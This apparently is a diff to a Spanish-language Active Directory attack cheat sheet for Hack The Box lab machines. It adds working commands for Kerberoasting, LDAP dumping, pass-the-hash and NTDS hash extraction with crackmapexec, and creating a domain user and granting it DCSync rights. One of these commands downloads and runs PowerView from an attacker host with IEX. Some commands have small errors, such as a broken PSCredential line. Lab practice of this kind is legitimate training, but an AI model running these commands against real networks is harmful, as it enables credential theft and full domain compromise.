@@ -112,6 +112,9 @@ evil-winrm -i 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'
 ```bash
 # Acceso a consola evil-winrm. Credenciales válidas y servicio de administración remota  
 evil-winrm -i 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'
+
+# Si el LDAP es por SSL
+evil-winrm -i 10.10.10.175 -c public.pem -k provate.pem -s
 ```
 
 ```bash
@@ -129,6 +132,16 @@ rpcclient $> queryuser 0x1f4
 rpcclient $> querydispinfo
 ```
 ## Escalada de privilegios
+
+### Kerberoasting attack
+
+Con credenciales válidas.
+ ```bash
+
+ impacket-GetUserSPNs htb.local/alfresco -dc-ip 10.10.10.141
+ 
+ ```
+
 
 ### WinPEAS
 
@@ -155,6 +168,17 @@ Buscamos un recolector y lo subimos a la maquina victima.
 
 En el caso de Poweshell SharpHound.ps
 
+### Ldapdomaindump
+
+Para dumpear el LDAP.
+
+```bash
+# Dumpea los HASHSES
+ldapdomaindump -u 'htb.local/svc-alfresco' -p 's3vice' 10.10.10.161
+
+```
+
+
 ### Ataque DCSync
 
 ```bash
@@ -171,4 +195,39 @@ Si hemos tenido suerte y tenemos el hash NTLM podemos hacer Pass the HASH con ps
 # Pass the hash,
 impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator:10.10.10.175 cmd.exe -hashes :elhahsahnt
 
+# Tambien con crackmapexec. Dumpeamos todos los hashes
+crackmapexec -u 'Administrator' -H 'elhashntlm' --ntds vss
+# Conexión como administrador
+crackmapexec -u 'Administrator' -H 'elhashntlm' 
+
 ```
+
+## Grupos interesantes:
+
+* **Account Operators**: Puede crear y modificar usuarios
+* **Exchange Windows Permissions** Se puede otorgar permisos para ejecutar DCSync con la funcion WriteDacl
+
+## Comandos
+
+```poweshell
+# Crear usuario
+net user jamunof Password123 /add /domain
+
+# Ver info usuario
+net user jamunoz
+
+# Ver grupos
+net group
+
+#Añadir usuario a grupo
+net group "Exchange Windows Permissions" jamunoz /add
+
+#Dar privilegios para DCSync
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\jamunoz'.$SecPassword)
+# Descargar PowerView.ps1, previemente descargado de internet en maquina atacante
+IEX(New-Object Net.WebClient).downloadString('http://10.10.104.29/PowerView.ps1')
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity jamunoz -Rights DCSync
+
+```
+
